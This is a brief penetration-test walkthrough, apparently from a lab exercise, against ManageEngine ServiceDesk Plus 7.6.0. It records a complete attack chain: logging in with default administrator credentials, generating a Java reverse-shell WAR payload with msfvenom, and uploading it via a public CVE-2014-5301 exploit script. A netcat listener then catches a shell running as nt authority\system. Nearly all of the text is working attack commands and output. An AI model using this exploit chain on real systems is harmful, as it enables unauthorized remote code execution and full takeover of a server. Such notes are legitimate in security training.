# 2 :8080 ManageEngine ServiceDesk Plus 7.6.0

```
# using default creds
administrator:administrator


Using https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.105 LPORT=8080 -f war -o shell.war
Payload size: 13325 bytes
Final size of war file: 13325 bytes
Saved as: shell.war

$ python3 CVE-2014-5301.py 192.168.105.43 8080 administrator administrator shell.war
Trying http://192.168.105.43:8080/jWVecNpxANmQn4YneI4Wsn1TQGhDxFMN/ryqevqrqcuvxmcp/uzrPUP3jyXZHaxoI
Trying http://192.168.105.43:8080/jWVecNpxANmQn4YneI4Wsn1TQGhDxFMN/ryqevqrqcuvxmcp/wC6GADalTfhOIZqb


$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.43] 49181
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\ServiceDesk\bin>whoami
whoami
nt authority\system
```
